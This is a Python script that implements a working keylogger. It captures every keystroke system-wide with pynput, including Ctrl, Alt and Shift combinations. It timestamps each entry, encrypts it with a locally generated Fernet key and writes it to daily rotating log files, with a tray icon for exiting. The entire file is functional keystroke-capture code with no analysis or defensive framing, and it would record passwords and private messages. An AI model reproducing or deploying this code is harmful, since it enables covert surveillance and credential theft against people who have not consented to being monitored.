from pynput.keyboard import Listener, Key
from datetime import datetime
import logging
from logging.handlers import TimedRotatingFileHandler
from cryptography.fernet import Fernet
import base64
import threading
import pystray
from PIL import Image

def start_logger(log_file, key_mappings):
    # Generate or load encryption key
    try:
        with open("key.key", "rb") as f:
            key = f.read()
    except FileNotFoundError:
        key = Fernet.generate_key()
        with open("key.key", "wb") as f:
            f.write(key)
    cipher = Fernet(key)

    # Configure logging with rotation
    logger = logging.getLogger('keylogger')
    logger.setLevel(logging.INFO)
    handler = TimedRotatingFileHandler(log_file, when='midnight', interval=1, backupCount=7)
    logger.addHandler(handler)

    # Map string keys to pynput Key objects
    key_map = {
        "space": Key.space,
        "enter": Key.enter,
        "tab": Key.tab,
        "backspace": Key.backspace,
        "shift": Key.shift,
        "ctrl_l": Key.ctrl_l,
        "alt_l": Key.alt_l,
        "esc": Key.esc,
        "up": Key.up,
        "down": Key.down,
        "left": Key.left,
        "right": Key.right,
        "f1": Key.f1,
        "f2": Key.f2,
        "f3": Key.f3,
        "f4": Key.f4,
        "delete": Key.delete,
        "home": Key.home,
        "end": Key.end,
        "page_up": Key.page_up,
        "page_down": Key.page_down,
        "caps_lock": Key.caps_lock
    }
    
    # Create key mappings dictionary
    mappings = {key_map[k]: v for k, v in key_mappings.items()}
    
    # Track modifier states for key combinations
    modifiers = {'ctrl': False, 'alt': False, 'shift': False}
    
    # Flag to stop the listener
    listener_running = [True]  # Use list to allow modification in nested function

    def on_press(key):
        if not listener_running[0]:
            return False  # Stop listener if flag is False
        try:
            # Update modifier states
            if key in [Key.ctrl_l, Key.ctrl_r]:
                modifiers['ctrl'] = True
            elif key in [Key.alt_l, Key.alt_r]:
                modifiers['alt'] = True
            elif key in [Key.shift, Key.shift_r]:
                modifiers['shift'] = True

            # Skip logging modifier keys
            if key in [Key.ctrl_l, Key.ctrl_r, Key.alt_l, Key.alt_r, Key.shift, Key.shift_r]:
                return

            # Get key data
            data = mappings.get(key, str(key).replace("'", ""))
            
            # Add modifier prefixes
            prefix = ''
            if modifiers['ctrl']:
                prefix += 'Ctrl+'
            if modifiers['alt']:
                prefix += 'Alt+'
            if modifiers['shift']:
                prefix += 'Shift+'
            data = f"{prefix}{data}"
            
            # Log with timestamp
            timestamp = datetime.now().strftime("%m/%d/%y %I:%M:%S %p")
            log_entry = f"[{timestamp}] {data}"
            
            # Encrypt and log to file
            encrypted_entry = cipher.encrypt(log_entry.encode())
            logger.info(base64.b64encode(encrypted_entry).decode())
        except Exception as e:
            print(f"Error logging key: {e}")

    def on_release(key):
        if key in [Key.ctrl_l, Key.ctrl_r]:
            modifiers['ctrl'] = False
        elif key in [Key.alt_l, Key.alt_r]:
            modifiers['alt'] = False
        elif key in [Key.shift, Key.shift_r]:
            modifiers['shift'] = False

    def on_exit(icon, item):
        listener_running[0] = False  # Signal listener to stop
        icon.stop()

    # Create system tray icon
    image = Image.new('RGB', (64, 64), color='black')  # Placeholder icon
    icon = pystray.Icon("keylogger", image, "Keylogger", menu=pystray.Menu(
        pystray.MenuItem("Exit", on_exit)
    ))

    # Start listener in a separate thread
    listener_thread = threading.Thread(
        target=lambda: Listener(
            on_press=on_press,
            on_release=on_release
        ).run(),
        daemon=True
    )
    listener_thread.start()

    # Run system tray icon
    icon.run()